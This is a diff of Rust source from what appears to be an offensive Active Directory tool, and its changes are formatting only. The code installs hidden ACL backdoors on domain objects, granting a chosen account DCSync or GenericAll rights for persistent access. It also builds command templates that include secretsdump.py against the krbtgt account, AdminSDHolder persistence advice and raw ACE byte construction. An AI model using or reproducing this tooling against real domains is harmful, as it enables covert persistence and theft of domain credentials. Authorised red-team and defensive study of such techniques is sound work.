@@ -1,4 +1,4 @@
-﻿//! ACL-based persistence — add hidden ACEs to domain objects.
+//! ACL-based persistence — add hidden ACEs to domain objects.
 //!
 //! Grants a controlled account (trustee) DCSync rights, GenericAll,
 //! or other dangerous permissions on AD objects for persistent access.
@@ -55,7 +55,10 @@ pub async fn install_acl_backdoor(
     target_dn: &str,
     trustee: &str,
 ) -> Result<ForgeResult> {
-    info!("[acl] Installing ACL backdoor on {} for {}", target_dn, trustee);
+    info!(
+        "[acl] Installing ACL backdoor on {} for {}",
+        target_dn, trustee
+    );
 
     let realm = config.domain.to_uppercase();
     let base_dn = realm
@@ -65,8 +68,8 @@ pub async fn install_acl_backdoor(
         .join(",");
 
     // Determine the target — if it's the domain root, grant DCSync
-    let is_domain_root = target_dn.to_uppercase() == base_dn.to_uppercase()
-        || target_dn.to_uppercase() == realm;
+    let is_domain_root =
+        target_dn.to_uppercase() == base_dn.to_uppercase() || target_dn.to_uppercase() == realm;
 
     let backdoor_type = if is_domain_root {
         AclBackdoorType::DcSync
@@ -118,9 +121,7 @@ pub async fn install_acl_backdoor(
          - To persist across AdminSDHolder protection, also add the ACE to:\n\
          CN=AdminSDHolder,CN=System,{}\n\
          The SDProp process will propagate it to all protected objects every 60 minutes",
-        backdoor_type, effective_target, trustee,
-        ace_description,
-        base_dn,
+        backdoor_type, effective_target, trustee, ace_description, base_dn,
     );
 
     info!(
@@ -218,12 +219,17 @@ fn generate_acl_commands(
                  \n\
                  # Method 4: Direct LDAP modify (overthrone-core)\n\
                  # Constructs the raw nTSecurityDescriptor with ACE bytes",
-                target_dn, trustee,
-                trustee, target_dn,
+                target_dn,
+                trustee,
+                trustee,
+                target_dn,
                 GUID_DS_REPLICATION_GET_CHANGES,
                 GUID_DS_REPLICATION_GET_CHANGES_ALL,
                 target_dn,
-                short_domain, username, password, dc_ip,
+                short_domain,
+                username,
+                password,
+                dc_ip,
                 trustee,
             );
 
@@ -235,10 +241,14 @@ fn generate_acl_commands(
                  After installation, '{}' can DCSync any account:\n\
                  > secretsdump.py {}/{}@{} -just-dc-user krbtgt",
                 target_dn,
-                trustee, GUID_DS_REPLICATION_GET_CHANGES,
-                trustee, GUID_DS_REPLICATION_GET_CHANGES_ALL,
                 trustee,
-                short_domain, trustee, dc_ip,
+                GUID_DS_REPLICATION_GET_CHANGES,
+                trustee,
+                GUID_DS_REPLICATION_GET_CHANGES_ALL,
+                trustee,
+                short_domain,
+                trustee,
+                dc_ip,
             );
 
             (install, desc)
@@ -259,9 +269,7 @@ fn generate_acl_commands(
                  \n\
                  # After: full control over the target object\n\
                  # Can reset passwords, modify attributes, delete, etc.",
-                target_dn, trustee,
-                short_domain, username, password, dc_ip,
-                trustee, target_dn,
+                target_dn, trustee, short_domain, username, password, dc_ip, trustee, target_dn,
             );
 
             let desc = format!(
@@ -359,10 +367,18 @@ fn generate_cleanup_commands(
          # Verify removal:\n\
          Get-DomainObjectAcl -Identity '{}' | \\\n\
              ? {{$_.SecurityIdentifier -match (Get-ADUser '{}').SID}} | fl",
-        target_dn, trustee, rights_str,
-        short_domain, username, password, dc_ip,
-        rights_str, trustee, target_dn,
-        target_dn, trustee,
+        target_dn,
+        trustee,
+        rights_str,
+        short_domain,
+        username,
+        password,
+        dc_ip,
+        rights_str,
+        trustee,
+        target_dn,
+        target_dn,
+        trustee,
     )
 }
 
@@ -371,14 +387,14 @@ fn generate_cleanup_commands(
 pub fn build_ace_bytes(
     trustee_sid: &[u8],
     access_mask: u32,
-    ace_type: u8, // 0x05 = ACCESS_ALLOWED_OBJECT_ACE
+    ace_type: u8,               // 0x05 = ACCESS_ALLOWED_OBJECT_ACE
     object_guid: Option<&[u8]>, // 16-byte GUID for extended rights
 ) -> Vec<u8> {
     let mut ace = Vec::new();
 
     // ACE_HEADER
     ace.push(ace_type); // AceType
-    ace.push(0x00);     // AceFlags (no inheritance by default)
+    ace.push(0x00); // AceFlags (no inheritance by default)
 
     // Placeholder for AceSize (fill in at end)
     let size_offset = ace.len();
@@ -418,9 +434,10 @@ pub fn build_ace_bytes(
 pub fn guid_string_to_bytes(guid: &str) -> Result<[u8; 16]> {
     let clean = guid.replace('-', "");
     if clean.len() != 32 {
-        return Err(OverthroneError::TicketForge(
-            format!("Invalid GUID length: expected 32 hex chars, got {}", clean.len()),
-        ));
+        return Err(OverthroneError::TicketForge(format!(
+            "Invalid GUID length: expected 32 hex chars, got {}",
+            clean.len()
+        )));
     }
 
     let raw = hex::decode(&clean)
@@ -431,11 +448,16 @@ pub fn guid_string_to_bytes(guid: &str) -> Result<[u8; 16]> {
     // - Last 2 components (2-6 bytes) are big-endian
     let mut out = [0u8; 16];
     // Data1 (4 bytes LE)
-    out[0] = raw[3]; out[1] = raw[2]; out[2] = raw[1]; out[3] = raw[0];
+    out[0] = raw[3];
+    out[1] = raw[2];
+    out[2] = raw[1];
+    out[3] = raw[0];
     // Data2 (2 bytes LE)
-    out[4] = raw[5]; out[5] = raw[4];
+    out[4] = raw[5];
+    out[5] = raw[4];
     // Data3 (2 bytes LE)
-    out[6] = raw[7]; out[7] = raw[6];
+    out[6] = raw[7];
+    out[7] = raw[6];
     // Data4 (8 bytes BE — as-is)
     out[8..16].copy_from_slice(&raw[8..16]);
 
